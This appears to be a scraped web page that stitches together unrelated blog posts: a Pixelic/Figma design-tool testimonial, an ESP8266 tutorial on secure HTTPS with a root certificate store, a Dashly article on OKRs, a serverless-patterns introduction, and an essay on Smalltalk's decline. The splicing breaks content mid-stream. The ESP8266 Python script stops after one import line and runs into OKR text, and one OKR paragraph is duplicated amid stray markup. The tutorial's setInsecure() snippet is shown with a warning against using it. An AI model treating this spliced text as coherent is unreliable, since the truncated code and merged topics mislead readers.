https://blog.pixelic.io/content/images/size/w2400/2020/07/task-comments.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Figma frame comments are always connected with tasks bi-directionally.</figcaption></figure><p>This has two key benefits: (1) anyone can understand the context behind the task without asking others, and (2) view relevant Figma frames, or user flows without logging into Figma.</p><p>Engineers and product managers can access relevant UIs connected to each task and quickly understand the task.</p><p>Adding links, screenshots, and descriptions to each task on Jira or Asana is cumbersome if you have to do them every time. In Pixelic, since Figma frames are connected to each task, there’s no need to copy/paste links or screenshots.</p><blockquote>“What if we allow our users to sign up directly from the <strong>home screen</strong>?”</blockquote><p>Let’s say your colleague suggested above during a product meeting. How many of your team would think of the same screen? Was it the landing page? Sign up page? Main application page?</p><p>Without a shared understanding of the product, it’s challenging to communicate, and often people would have to elaborate with more details.</p><p>It’s too hard for people to see the forest through the trees, so to speak. Without the interface, people will think of different representations of the product. It’s just not an effective way to collaborate.</p><blockquote>“This wasn’t what I thought of.”<br>– said every stakeholder 🙄</blockquote><p>Driving shared understanding is crucial to make your workflow productive. Too often, teams revert back to ideation because they failed to align on the same page.</p><p>From my experience working at various startups as a product designer, what worked was communicating visually.</p><p>Visual communication saves not only the presenter’s time but also the audience because they can see what you’re seeing. Experts say a human brain processes images 60,000 times faster than texts.</p><h3 id="pixelic-is-the-ultimate-visual-communication-software">Pixelic is the ultimate visual communication software</h3><figure><img src="https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1000w, https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>I took a screenshot of our team discussion on Pixelic (in Korean).</figcaption></figure><p>In offline meetings, you can point out where you are talking about with your fingertips, but in remote settings, it’s not that simple. And remote collaboration via video conferencing now became the norm since COVID-19.</p><p>Pixelic helped us see the visuals (interface) as well as comments next to them while video conferencing. In Pixelic, you can click &amp; drag specific areas of the image and comment on them. This helped us to store everything so we could always go back to them later.</p><h2 id="in-conclusion">In Conclusion</h2><p>Yes, adding a tool to your already tool stack isn’t the most exciting thing for your team. But if the new tool replaces or complements your current stack to enhance team productivity, it’s a no brainer to adopt it.</p><p>Pixelic was a no brainer for us. Through Pixelic, we were able to enhance our team productivity. It helped us build a clear, shared understanding of our product across the team. And managing design projects were super easy and convenient thanks to its seamless integration with Figma.</p><p>There are some features that Pixelic still needs to add to replace our entire design collaboration tool stack, but ever since we started using Pixelic, its founders moved fast to add new fixes and updates every week.</p><p>The founders have been super supportive of any questions or requests we had. We’re excited to partner with the Pixelic team to build an optimal tool for software teams.</p><hr><p><em>Jieun is a product designer based in Seoul, South Korea.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Fetching or posting data to the internet is one of the core tasks of an IoT device. Doing so over HTTP is implemented quite well in the default ESP8266 Arduino libraries, but for HTTPS requests things are more difficult. In this post I will discuss the most common approaches used by the community, and develop my own method to do arbitrary HTTPS requests in a secure way. This method will not require any specific certificates or fingerprints to be manually coded in the application.</p><p>HTTPS if a method to do a HTTP request over a TLS (formerly SSL) connection. By doing so, the data that is sent back and forth between your computer and the server is encrypted and protected. The good news is that this protocol can be used with the ESP8266 with the <span>WiFiClientSecure</span> class. The bad news is that the common methods to do so have some big disadvantages.</p><p>First I will show the two most common approaches, and next I will describe a generic solution to their problems.</p><h3>A word about certificates</h3><p>Before diving into the details I will briefly explain the basic principles of secure HTTPS requests in layman's terms.</p><p>Basically, every website has a certificate. This certificate is issued by somebody, who is called a certification authority (CA). Each CA certificate can be issued by another CA which leads to the so called certificate chain. In the picture the chain is 3 certificates long, but in reality the length of the chain can be anything.</p><p>A certificate chain. Image from Wikipedia</p><p>The top level certificate is called a root certificate. This certificate is self-signed, which means that it can be trusted inherently. This is because only a few organisations can issue root certificates, and these are trusted to not offer fake or wrong certificates.</p><p>When you do a HTTPS request to a website from your browser, the browser will look at the certificate for the website, and validating if the certificate is indeed issued by its parent. This can be done because each certificate is signed with the private key of the upstream certificate. An explanation for dummies on public and private keys work can be found <a href="https://medium.com/@vrypan/explaining-public-key-cryptography-to-non-geeks-f0994b3c2d5" target="_blank" rel="noopener noreferrer">here<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>.</p><p>When it is verified that the certificate is indeed issued by a trusted root CA issuer, it is verified that the domain in the certicate is the same as the actual domain. If that is true, we know that the server is who it claims to be, and a secure connection can be started . </p><p>These trusted root certificates are actually stored as part of your browser to be able to validate all other certificates. Each OS or browser stores a slightly different set of roughly 100-200 root certificates, which it knows can be trusted. This is called a certificate store, and this is exactly what I will apply on the ESP8266 later in this article. But first, let's start with the two most popular other approaches.</p><h3>Fingerprints - secure but annoying</h3><p>The method that is proposed in the official ESP8266 Arduino <a href="https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/client-secure-examples.html" target="_blank" rel="noopener noreferrer">documentation<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a> is to extract the fingerprint of a site's certificate and store this in the code. The fingerprint is a hash of the certificate. Because it is very unlikely that a second certificate exists with the same hash, we know the website can be trusted if the hash is the same as the one we store.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
const char<span>*</span> fingerpr <span>=</span> <span>"CF 05 98 89 CA FF 8E D8 5E 5C E0 C2 E4 F7 E6 C3 C7 50 DD 5C"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>

<span>if</span> <span>(</span>client<span>.</span><span>verify</span><span>(</span>fingerpr<span>,</span> host<span>)</span><span>)</span> 
<span>{</span>  
    http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

    <span>String</span> payload<span>;</span>
    <span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
        payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
<span>}</span>
<span>else</span> 
<span>{</span>
  <span>Serial</span><span>.</span><span>println</span><span>(</span><span>"certificate doesn't match"</span><span>)</span><span>;</span>
<span>}</span></code></pre><p>This approach is simple because the certificate chain does not need to be validated, but has two main issues for me:</p><ol><li>The fingerprint needs to be extracted and stored manually for each page the ESP8266 needs to connect to.</li><li>An even bigger issue is that these fingerprints change roughly once a year when the certificate expires. This means that your program can break at any time and you manually need to update the fingerprint in your code.</li></ol><h3>client.setInsecure() - easy but unsafe</h3><p>You could argue that secure connections are overkill for your application. I would be the first to admit that I prefer a pragmatic solution where possible. Imagine that all you want to do with your ESP8266 is to fetch the weather from the internet and display it in some form. Personally I would not mind to do this in an insecure way, since there are no real dangers.</p><p>But imagine the ESP8266 is controlling the lock on your door or a 3D printer which can heat up and catch on fire. Or think of the case where you are transfering personal information to or from some site or API. In these cases it is better to be safe than sorry, and the method in this section should not be used. Nevertheless, I will show it here:</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>setInsecure</span><span>(</span><span>)</span><span>;</span> <span>//the magic line, use with caution</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>
  
http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
</code></pre><p>So basically all you need to do is to add <span>client.setInsecure()</span> to your code and it will start the connection without validating the certificate. </p><h3>HTTPS requests with the IoT framework</h3><p>With that out of the way, we finally get to the implementation I have chosen instead for my ESP8266 IoT Framework, which is placed in the <span>fetch</span> class.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>            

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>fetch<span>.</span><span>GET</span><span>(</span>host<span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    

fetch<span>.</span><span>clean</span><span>(</span><span>)</span><span>;</span>
</code></pre><p>Looks easy enough doesn't it ? So what happens behind the scenes? </p><p>Basically the same thing as in a typical Browser. The ESP8266 contains a full store of all the trusted root certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> memory. This takes roughly ~170 kB of flash memory at the moment, which in my case can easily be missed. This certificate store is generated automatically on building the sofware, no manual steps required. This also means that you can do secure HTTPS requests to any URL (so you could even configure or change a URL after the build).</p><p>You might think, but hey! These certificates will expire too. And this is true. The only difference with the fingerprints is that the validity of root certificates is much longer, and can be over 20 years. Whereas the fingerprint for some services can change every few months.</p><p>As a starting point I found a great but hidden example in the ESP8266 Arduino <a href="https://github.com/esp8266/Arduino/tree/master/libraries/ESP8266WiFi/examples/BearSSL_CertStore" target="_blank" rel="noopener noreferrer">repo<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>. This example contains a Python script that gets all the certificates from the Mozilla root certificate store and stores them as files. These files will then be uploaded to the <abbr title="SPIFFS is an abbreviation for 'Serial Peripheral Interface Flash File System', which is a way to store files on embedded systems.">SPIFFS</abbr> and used during HTTPS requests. I adapted this example to be able to store the certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> instead.</p><h3>Generating a certificate store</h3><p>When a request is started, the <span>certStore</span> class will compare the hash of the certificate issuer with all the hashes of the stored root certificates. If there is a match, the correctness of the domain and other properties will be checked and the connection will be initialized.</p><p>In the default Arduino example these hashes for the stored certificates are generated in the <span>certStore</span> class. It seems more logical to me to do this directly in the Python script to save computing time on the ESP8266, so thats where I moved it. Furthermore I adapted the <span>certStore</span> class (<a href="https://github.com/maakbaas/esp8266-iot-framework/blob/master/src/certStore.cpp" target="_blank" rel="noopener noreferrer">GitHub<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>) to read the information from my <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> variables rather than the file system. </p><p>The final Python script to generate the certificate store is shown below.</p><pre><code><span>from</span> __future__ <span>import</span> print_function

<p>In this article, we’ll tell you what the OKR concept implies and how to start adhering to it.</p>


<div>
  <p>
    When we grew from 10 to 30 people, we got to thinking we became defocused and asynchronous. One part of the team didn’t know what another one was doing; we were playing the Chinese whispers feeling we were heading separate ways. That’s exactly when we decided to adhere to OKR and we still do so.   </p>

  
</div>




<p>Many companies face the same problem, and the OKR framework helps tackle the issue, namely sync people up and help them move in the same direction while meeting their objectives. We’ve got some experience to tell you how you can implement OKR and why no one can do this right the first time (which is completely normal).</p>



<p>To make this article more insightful, we’ve talked to Ilya, a product &amp; strategy thinking mentor, and discovered his experience in implementing OKR in different companies.</p>



<p>Grab your pen and some paper and make notes on the OKR implementation as you read this article.&nbsp;</p>




<h2 id="what-is-the-okr">What is the OKR?</h2>



<p><strong>OKR (objectives and key results)</strong> is a goal-setting framework helping you determine the direction of your company’s growth, sync teams up, and engage all employees in the process of setting objectives and defining key results.&nbsp;</p>



<p>The objectives are set at these levels:</p>



<ul><li>company,</li><li>teams,</li><li>particular employees.</li></ul>



<p>Objectives are then decomposed into measurable results the company wants to achieve. The objective is marked as achieved if a certain result is met.</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg" alt="mission strategy key results tasks" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg"></figure>



<p>OKRs first appeared in Intel and then moved to Google. Now many high profile companies like Spotify, Twitter, Airbnb, and Miro use them. It doesn’t mean OKRs can only be applied in the IT universe. You can use them anywhere! Even when planning your own life. I mean it.&nbsp;</p>



<p>For example, my objective for the next 2 years is to learn French. My key results are to pass DALF for C1 and have 10 Tinder matches with native speakers.&nbsp;</p>



<p>The major thing about OKR is that both top management and the whole company are involved in defining objectives and key results. That’s why OKRs help you sync up with your team, move in the same direction, and increase the involvement of each team member as everyone knows how they can influence the achievement of a common objective.&nbsp;</p>




<h2 id="what-makes-okrs-so-great">What makes OKRs so great?</h2>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg" alt="what makes OKR great" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg"></figure>



<p><strong>Transparency:</strong> to make sure OKRs work for good, the company should be 100% transparent for its employees. That’s the only way you can encourage the team to perform great. Every employee should have access to OKRs.</p>



<p><strong>Simplicity:</strong> OKRs are easy to use and understand. Any person opening the OKR spreadsheet can easily get what it’s saying.</p>



<p><strong>Flexibility:</strong> OKRs can be set for any term from a month to several years. This helps you set the pace of the company’s development and adjust to the environment quickly.</p>



<p><strong>Two-way goal-setting:</strong> OKRs are not set for teams by the top management. They can draw up the OKRs, but then they should pass them on to teams so that they can edit and adjust the OKRs. And there can be several iterations.</p>



<p><strong>Inspiring goals:</strong><strong> </strong>within the OKR concept, objectives should be ambitious and catchy. Inspiring objectives encourage the team to achieve better results. However, the OKR assumes that you can’t achieve 100% of your objectives and that’s completely okay.</p>



<p><strong>An OKR isn’t a KPI:</strong> The OKR concept doesn’t have an incentive system for achieving objectives. Non-monetary motivation establishes a welcoming environment. So, employees are willing to generate ambitious ideas and have no fear of not meeting the targets.&nbsp;</p>


<div>
  <p>
    An OKR isn’t a KPI. There’s no cash bonus for meeting the OKR. The concept is different, and that’s cool. An OKR isn’t something that should be 100% achieved. If we achieve 100% of our OKRs, it means our objectives were not ambitious enough. And vice versa, if we only achieved 30% of our OKRs, it means we’ve set the bar too high. Meeting around 70% of OKRs says we’re doing a great job.  </p>

  
</div>





<h2 id="objectives-key-results-and-initiatives">Objectives, key results, and initiatives</h2>



<p>How do we define Objectives and Key Results (KR)? John Doerr’s formula helps you get the difference between these two.<a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/John_Doerr" target="_blank" rel="noreferrer noopener"> John Doerr</a> is the person who invented OKR and shared his knowledge with Google. Here’s his formula:</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg" alt="i will be as measured by" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg"></figure>



<p>Within the concept, the objective setting is based on its definition and our perception of an achieved objective. The objective should describe the target, and the key results are the parameters we will use to know if we have met the objective. Let’s look closer at the formula:&nbsp;</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg" alt="i will be happy in case" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg"></figure>



<p>Key results are an equally important part of the formula. They are decisive in whether an objective has been met or not.</p>



<p>Another way to understand KRs is to ask the question: “If our goal is X, what will success look like?”</p>


<div>
  <p>
    The OKR has an objective that may sound obscure in terms of the result, but it’s powerful and appealing. The second part is the key result, most often it’s a specific metric. The key result shows whether the objective has been met or not. If the goal is inspiring, then the KR reflects reality.  </p>

<h3><strong>What should be the objectives?</strong></h3>



<p><strong>Objectives </strong>are catchy qualitative descriptions of what we want to achieve. Objectives should be concise, ambitious, inspiring, and engaging. They must encourage and challenge the team. In this case, the whole company will have a better chance of achieving greater success.</p>



<h3><strong>What are the “key results”?</strong></h3>



<p><strong>Key results </strong>are a set of parameters that we use to assess how close we have gotten to our objective. Each objective usually involves between 3 to 5 KRs. If you pick more, the teams will find it hard to stay focused. Key results must be quantitative and measurable.</p>



<p>There are 2 kinds of key results:</p>



<ul><li><strong>Key action-driven result.</strong> Success is measured in completed/not completed projects.</li><li><strong>Key value-driven result.</strong> Success is measured in the value that the company or customers obtain.</li></ul>



<p>Here are some results of key action-driven results:</p>



<ul><li>the chatbot launch</li><li>an online course launching</li><li>the OKR book release</li></ul>



<p>Below are some key value-driven results:</p>



<ul><li>increasing the MRR from X to Y;</li><li>decreasing the Churn rate from X to Y;</li><li>increasing the ER from X to Y;</li><li>maintaining the CAC at around X.</li></ul>



<p>Take a look at the table of key action-driven results and their value equivalents:</p>



<div><figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg" alt="key action-driven results and key value-driven results" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg"></figure></div>



<p>Key action-driven results are highly likely to fail in leading you to an objective. The release of a new feature is not a success guarantee. That’s why OKRs have to be value-driven. Only then can they be as effective as possible.&nbsp;</p>



<p>Key results should reflect the value to the company or its customers. Teams will be focused on achieving greater success and there’ll be more room for creativity. The employees won’t be stuck on a particular activity but will look for different ways to achieve the objective.&nbsp;</p>



<p>But if you’re implementing the concept for the first time, it makes more sense to choose actions as key results. They will help you to switch to OKR:</p>



<p>Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics.</p>

    Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics. First, it’s a good idea to put a set of actions in KRs that we have to perform to get closer to the objective: release a huge feature or a marketing campaign. By the end of the OKR term, you’ll be able to evaluate the success based on the done/not done principle. Another very important point is to only include metrics that we know how to calculate in KRs.   </p>

<h3>How we did it at Dashly</h3>



<p>Last year, the goal for OKR in Dashly was to double the number of active users. It’s a catchy and quite ambitious goal, isn’t it?&nbsp;</p>



<p>How do we know if we’ve achieved it or not? We’ve chosen key metric-based results and we’ve put all our effort to reach them and evaluate our success using them.</p>



<p>If objectives are about ambitions, key results must be clear and precise.&nbsp;</p>



<p>The key results for the “doubling” target could be the following:</p>



<ul><li>Increasing the MRR to X: this is our monthly revenue. If we want to grow, we should grow our revenue, too.&nbsp;</li><li>Decreasing the Churn rate to Y. The fewer users leave us, the easier it is for us to grow.</li><li>The CAC must not exceed: this is the Customer Acquisition Cost. If we want to be efficient, we can’t spend more than a certain amount on user acquisition.</li><li>Increasing the number of organic visitors to X. The more website visitors we have, the more purchases we generate.&nbsp;</li></ul>



<h3>OKR initiatives</h3>



<p>Objectives and key results should be value-oriented. So, you must learn not to mix them up with activities and tasks that need to be done to achieve the OKR. Initiatives will help in this.</p>



<p><strong>Initiatives </strong>are the very activities, tasks, and projects that you need to accomplish to achieve the OKR.</p>



<p>Let’s get back to our goal of doubling up. We’ve chosen several key results we’ll use to evaluate our success in the future. The KRs are to increase the MRR to X and decrease the Churn rate to Y. And these are the initiatives:&nbsp;&nbsp;</p>



<ul><li>launching the chatbot: a huge and awesome feature will help decrease the customer churn;</li><li>online course release will help generate new target leads;</li><li>the OKR book release will help increase the number of product signups.</li></ul>

<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on<strong> <a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a>&nbsp;</strong>that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.</p>
<p>I will be adding new patterns regularly, each with interactive architecture diagrams to help you better understand them, and sample templates for you to begin quickly implementing them in your serverless projects. <strong>This is a community effort, so <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener">contributions</a> are welcome and greatly appreciated.</strong> Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>I’ve been thinking about designing my own programming language for a long time. I’ve actually been keeping a lot of notes, and even throwing together some code when I can find time. My plan is to build something that takes inspiration from LISP, JavaScript and Smalltalk. I think there’s a niche to be filled. There are many new programming languages coming out lately, but most of them are statically typed and compiled ahead of time. The <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">dynamic languages</a> that do come out often don’t perform very well (see CPython, Ruby) or have poorly thought out&nbsp;semantics.</p>
<p>I’ve written a few&nbsp;blog posts pointing and laughing at perceived failures of JavaScript, but the truth is that programming language design is hard.&nbsp;There’s no limit to the complexity of the things you can build with programming code. No matter the design choices you make, no matter the language you design, there are bound&nbsp;to be some inconsistencies and weaknesses somewhere.&nbsp;I think that Smalltalk is a very inspiring programming language, revolutionary in many ways, but it’s also one that has gone extinct. It’s interesting, in my opinion, to ask ourselves why Python thrives but Smalltalk died.</p>
<p>Like LISP, Smalltalk implemented some interesting features which have influenced other languages (such as Java and JavaScript). Some nifty features of Smalltalk are really cool, but still aren’t implemented in any other language. For instance, Smalltalk had the ability to suspend running programs into a saved image, and resume execution later at the saved point. As you can imagine, this is extremely powerful and useful. Forget saving documents or saving games, just save the state of an entire program, no implementation effort required.</p>
<p>I found an interesting talk on YouTube titled “What Killed Smalltalk could Kill Ruby Too”:</p>
<p><span><iframe width="560" height="315" src="https://www.youtube.com/embed/YX3iRjKj7C0?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Robert Martin makes the case that one of the big weaknesses of Smalltalk is&nbsp;that it was just “too easy to make a mess”. Smalltalk was highly dynamic, and encouraged people to “monkey patch” things and do quick fixes/hacks.&nbsp;He also makes the point that Smalltalk just “didn’t play well with others”. When you think about it, Smalltalk had its own source control, IDE and GUI built into live images, living alongside your program. Smalltalk isn’t just a language, it’s an operating system and a way of life. It’s conflating things that would maybe be best left separate.</p>
<p>It seems to me that in some key areas, the&nbsp;Smalltalk creators placed their own radical ideas above everything else. They chose idealism over pragmatism. Smalltalk was a language created with a grandiose vision. It had some deeply rooted principles which didn’t necessarily work so well in practice, such as the idea that everything had to be an object, that the object metaphor should be applied everywhere, one size fits all.&nbsp;At the end of the day, programmers want to get things done and be productive. If the language design or implementation gets in the way of getting things done, people will leave. Pragmatism is key for a programming language to succeed.</p>
<p>Smalltalk was also designed with the idea that it should be easy to learn and intuitive. This has led its creators to have a heavy focus on graphical user interfaces.&nbsp;I watched an introduction to <a href="https://www.youtube.com/watch?v=Ox5P7QyL774">Self on YouTube</a>&nbsp;(Self is a direct descendent of Smalltalk) and saw the heavy emphasis on interacting with objects through UIs. The user interfaces showcased in this video are, in my opinion, horribly complex and unintuitive. Pretty much all of the interactions done through the UI would have been simpler and easier to understand if they had been done by writing one or two lines of code instead!</p>
<p>When you sit down and think about it for one second, you have to realize that programming doesn’t fundamentally have anything to do with graphical user interfaces. Yes, you can use programming code to create GUIs, but there is no reason that programming should have to involve GUIs and be tied to them. The metaphor of writing code has been extremely successful since the very beginning, and it probably makes more sense to the mathematical mind of a skilled programmer. Not everything has to have a visual metaphor. This is again a case of pushing some idealistic principle too far, in my opinion.</p>
<p>I believe that a lack of pragmatism is something that has killed many languages. Not just Smalltalk, but Scheme too. My first experience with Scheme involved trying and failing to install multiple Scheme distributions because I couldn’t get all the dependencies to work. Then, finally getting a Scheme compiler installed, and struggling to implement simple routines to parse text files, because Scheme doesn’t include&nbsp;the most basic string routines. The Scheme compiler I’d selected bragged that the code it produced was highly optimized, but once I finally managed to write my own string routines, I compiled my program, ran it, and it was dog slow.&nbsp;Parsing a one-megabyte CSV spreadsheet took over a minute. I ended up rewriting the code in Python. Why don’t more people code in Scheme? Because they try to realize their ideas in Scheme, and it just doesn’t quite work out.</p>
